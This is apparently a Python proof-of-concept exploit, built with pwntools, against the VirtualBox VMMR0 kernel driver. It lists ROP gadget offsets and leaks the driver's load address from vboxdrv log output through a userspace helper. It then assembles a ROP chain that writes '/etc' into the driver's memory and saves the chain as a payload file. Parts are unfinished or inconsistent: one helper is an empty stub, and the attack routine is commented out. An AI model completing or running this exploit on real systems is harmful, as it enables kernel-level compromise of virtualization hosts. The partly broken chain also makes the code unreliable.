#!/usr/bin/python3
import sys
from pwn import *
context.clear(arch='amd64', kernel='amd64')
'''
gcc userspace.c -o userspace
python3 ./poc.py VMMR0.r0

VMMR0:  http://www.ropshell.com/ropsearch?h=f81f7bdd9ffe47e093805c9d2f626f38
pop rdi; ret;                       VMMR0 + 0x7b62a
pop rax; ret;                       VMMR0 + 0x1f7bd
mov rax, [rdi + 0x2a50]; ret;       VMMR0 + 0x0b7470
syscall; ret;                       VMMR0 + 0x012c3c0
push rsp; ret;                      VMMR0 + 0x1f7ad
pop rbp; ret;                       VMMR0 + 0x28d
xor eax,eax; ret;                   VMMR0 + 0x8b8
'''

def leaked(start_leaker, search_for):
    # Get the address from the leak
    leaker = process(start_leaker)
    leak = [l for l in leaker.recv().decode('utf-8').replace('\r', '').split('\n') if 'vboxdrv:' in l and search_for in l]
    if len(leak) < 1:
        return
    leak = leak[-1].split()
    if len(leak) < 3:
        return
    leak = int(leak[-2], 16)
    return leak, leaker

def write_string_to_mem(rop, string, string_location):
    '''
    Writes a string to a location in memory
    '''

def write_4_bytes_to_mem(rop, binary_start, string, string_location):
    '''
    Writes 4 bytes to a location in memory, if string is not
    4 bytes it will have bytes appended
    string_location: binary_start - 0x2a50
    '''
    # mov rax, [rdi + 0x2a50]; ret;
    rop.raw(binary_start + 0x0b7470)
    # rdi
    rop.raw(string_location - 0x02a50)
    # pop rdi; ret;
    rop.raw(binary_start + 0x07b62a)
    # The string
    rop.raw(b'/etc')
    # pop rax; ret;
    rop.raw(binary_start  + 0x01f7bd)

def build(leak, gadget_file):
    # Load the target binary
    with open(gadget_file, 'rb') as i:
        binary = ELF.from_bytes(i.read(), vma=leak)
    # Create the ROP stack
    rop = ROP(binary)

    # Build a string in the .bss section of the target driver
    # the .bss section starts at the address the driver was loaded
    # We have to adjust because the gadget we have is rdi + 0x2a50
    write_4_bytes_to_mem(rop, leak, '/etc', leak)

    # Display our completed ROP chain
    print(rop.dump())
    return bytes(rop)

def create_exploit(leak, target_binary, payload_file):
    exploit = build(leak, target_binary)
    with open(payload_file, 'wb') as o:
        o.write(exploit)
    return exploit

def attack(target_binary, payload_file):
    leak, leaker = leaked(['./userspace', sys.argv[1], sys.argv[2]], sys.argv[1])
    print('Leaked address is', str(hex(leak)))
    exploit = create_exploit(leak, target_binary, payload_file)
    leaker.shutdown('send')
    leaker.shutdown()

def main():
    create_exploit(int(sys.argv[1], 16), sys.argv[2], sys.argv[3])
    # attack(sys.argv[1], sys.argv[2])

if __name__ == '__main__':
    main()
